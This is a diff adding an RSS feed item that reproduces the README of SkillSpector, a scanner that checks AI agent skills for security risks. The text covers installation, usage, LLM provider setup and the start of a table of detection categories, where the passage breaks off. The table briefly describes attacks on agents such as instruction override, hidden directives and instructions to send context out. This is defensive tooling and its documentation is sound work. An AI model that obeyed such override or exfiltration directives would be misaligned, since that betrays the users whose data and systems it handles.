@@ -1,0 +1,1177 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Security Scanning on Producthunt daily</title>
+        <link>https://producthunt.programnotes.cn/en/tags/security-scanning/</link>
+        <description>Recent content in Security Scanning on Producthunt daily</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en</language>
+        <lastBuildDate>Fri, 12 Jun 2026 19:13:41 +0800</lastBuildDate><atom:link href="https://producthunt.programnotes.cn/en/tags/security-scanning/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>SkillSpector</title>
+        <link>https://producthunt.programnotes.cn/en/p/skillspector/</link>
+        <pubDate>Fri, 12 Jun 2026 19:13:41 +0800</pubDate>
+        
+        <guid>https://producthunt.programnotes.cn/en/p/skillspector/</guid>
+        <description>&lt;img src="https://images.unsplash.com/photo-1659298338843-f0701c9eab64?ixid=M3w0NjAwMjJ8MHwxfHJhbmRvbXx8fHx8fHx8fDE3ODEyNjI2NDF8&amp;ixlib=rb-4.1.0" alt="Featured image of post SkillSpector" /&gt;&lt;h1 id=&#34;nvidiaskillspector&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/NVIDIA/SkillSpector&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;NVIDIA/SkillSpector&lt;/a&gt;
+&lt;/h1&gt;&lt;h1 id=&#34;skillspector&#34;&gt;SkillSpector
+&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Security scanner for AI agent skills.&lt;/strong&gt; Detect vulnerabilities, malicious patterns, and security risks before installing agent skills.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.python.org/downloads/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;img src=&#34;https://img.shields.io/badge/python-3.12&amp;#43;-blue.svg&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Python 3.12&amp;#43;&#34;
+	
+	
+&gt;&lt;/a&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://www.apache.org/licenses/LICENSE-2.0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;img src=&#34;https://img.shields.io/badge/License-Apache%202.0-blue.svg&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;License: Apache 2.0&#34;
+	
+	
+&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;overview&#34;&gt;Overview
+&lt;/h2&gt;&lt;p&gt;AI agent skills (used by Claude Code, Codex CLI, Gemini CLI, etc.) execute with implicit trust and minimal vetting. Research shows that &lt;strong&gt;26.1% of skills contain vulnerabilities&lt;/strong&gt; and &lt;strong&gt;5.2% show likely malicious intent&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;SkillSpector helps you answer: &lt;strong&gt;&amp;ldquo;Is this skill safe to install?&amp;rdquo;&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;documentation&#34;&gt;Documentation
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;docs/DEVELOPMENT.md&#34; &gt;Development guide&lt;/a&gt;&lt;/strong&gt; — Architecture, package layout, and how to extend the analyzer pipeline.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;features&#34;&gt;Features
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Multi-format input&lt;/strong&gt;: Scan Git repos, URLs, zip files, directories, or single files&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;64 vulnerability patterns&lt;/strong&gt; across 16 categories: prompt injection, data exfiltration, privilege escalation, supply chain, excessive agency, output handling, system prompt leakage, memory poisoning, tool misuse, rogue agent, trigger abuse, dangerous code (AST), taint tracking, YARA signatures, MCP least privilege, and MCP tool poisoning&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Two-stage analysis&lt;/strong&gt;: Fast static analysis + optional LLM semantic evaluation&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Live vulnerability lookups&lt;/strong&gt;: SC4 queries &lt;a class=&#34;link&#34; href=&#34;https://osv.dev&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;OSV.dev&lt;/a&gt; for real-time CVE data with automatic offline fallback&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Multiple output formats&lt;/strong&gt;: Terminal, JSON, Markdown, and SARIF reports&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Risk scoring&lt;/strong&gt;: 0-100 score with severity labels and clear recommendations&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;quick-start&#34;&gt;Quick Start
+&lt;/h2&gt;&lt;h3 id=&#34;installation&#34;&gt;Installation
+&lt;/h3&gt;&lt;p&gt;Create and activate a virtual environment first (all &lt;code&gt;make&lt;/code&gt; targets assume the venv is active). Use &lt;strong&gt;uv&lt;/strong&gt; or &lt;strong&gt;pip&lt;/strong&gt;; the Makefile uses &lt;code&gt;uv&lt;/code&gt; if available, otherwise &lt;code&gt;pip&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Clone the repository&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/NVIDIA/skillspector.git
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; skillspector
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Create and activate virtual environment&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;uv venv .venv &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; .venv/bin/activate
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# or: python3 -m venv .venv &amp;amp;&amp;amp; source .venv/bin/activate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Install for production use&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make install
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Or install with development dependencies&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make install-dev
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;basic-usage&#34;&gt;Basic Usage
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Scan a local skill directory&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./my-skill/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Scan a single SKILL.md file&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./SKILL.md
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Scan a Git repository&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan https://github.com/user/my-skill
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Scan a zip file&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./my-skill.zip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;output-formats&#34;&gt;Output Formats
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Terminal output (default) - pretty formatted&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./my-skill/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# JSON output - machine readable&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./my-skill/ --format json --output report.json
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Markdown output - for documentation&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./my-skill/ --format markdown --output report.md
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# SARIF output - for CI/CD integration and IDE tooling&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./my-skill/ --format sarif --output report.sarif
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;llm-analysis&#34;&gt;LLM Analysis
+&lt;/h3&gt;&lt;p&gt;For the best results, configure an OpenAI-compatible LLM endpoint for
+semantic analysis. Pick a provider with &lt;code&gt;SKILLSPECTOR_PROVIDER&lt;/code&gt;; each
+ships its own bundled default model. SkillSpector also works against
+local OpenAI-compatible servers (Ollama, vLLM, llama.cpp) and managed
+inference gateways.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Provider (&lt;code&gt;SKILLSPECTOR_PROVIDER&lt;/code&gt;)&lt;/th&gt;
+					&lt;th&gt;Credential env var&lt;/th&gt;
+					&lt;th&gt;Endpoint&lt;/th&gt;
+					&lt;th&gt;Default model&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;openai&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;OPENAI_API_KEY&lt;/code&gt; (+ optional &lt;code&gt;OPENAI_BASE_URL&lt;/code&gt;)&lt;/td&gt;
+					&lt;td&gt;api.openai.com (or any OpenAI-compatible URL)&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;gpt-5.4&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;anthropic&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;ANTHROPIC_API_KEY&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;api.anthropic.com&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;claude-opus-4-6&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;nv_build&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;NVIDIA_INFERENCE_KEY&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;build.nvidia.com&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;deepseek-ai/deepseek-v4-flash&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Stock OpenAI&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SKILLSPECTOR_PROVIDER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;openai
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;OPENAI_API_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;sk-...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./my-skill/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Anthropic&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SKILLSPECTOR_PROVIDER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;anthropic
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_API_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;sk-ant-...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./my-skill/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# NVIDIA build.nvidia.com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SKILLSPECTOR_PROVIDER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;nv_build
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;NVIDIA_INFERENCE_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;nvapi-...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./my-skill/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Local Ollama or any OpenAI-compatible endpoint&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SKILLSPECTOR_PROVIDER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;openai
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;OPENAI_API_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ollama
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;OPENAI_BASE_URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://localhost:11434/v1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SKILLSPECTOR_MODEL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;llama3.1:8b
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./my-skill/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Override the provider&amp;#39;s default model&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SKILLSPECTOR_MODEL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;gpt-5.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./my-skill/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Skip LLM analysis (faster, static analysis only)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;skillspector scan ./my-skill/ --no-llm
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;vulnerability-patterns&#34;&gt;Vulnerability Patterns
+&lt;/h2&gt;&lt;p&gt;SkillSpector detects &lt;strong&gt;64 vulnerability patterns&lt;/strong&gt; across 16 categories:&lt;/p&gt;
+&lt;h3 id=&#34;prompt-injection-5-patterns&#34;&gt;Prompt Injection (5 patterns)
+&lt;/h3&gt;&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;ID&lt;/th&gt;
+					&lt;th&gt;Pattern&lt;/th&gt;
+					&lt;th&gt;Severity&lt;/th&gt;
+					&lt;th&gt;Description&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;P1&lt;/td&gt;
+					&lt;td&gt;Instruction Override&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Commands to ignore safety constraints&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;P2&lt;/td&gt;
+					&lt;td&gt;Hidden Instructions&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Malicious directives in comments/invisible text&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;P3&lt;/td&gt;
+					&lt;td&gt;Exfiltration Commands&lt;/td&gt;
+					&lt;td&gt;HIGH&lt;/td&gt;
+					&lt;td&gt;Instructions to transmit context externally&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;P4&lt;/td&gt;
+					&lt;td&gt;Behavior Manipulation&lt;/td&gt;
+					&lt;td&gt;MEDIUM&lt;/td&gt;
+					&lt;td&gt;Subtle instructions altering agent decisions&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;P5&lt;/td&gt;
+					&lt;td&gt;Harmful Content&lt;/td&gt;
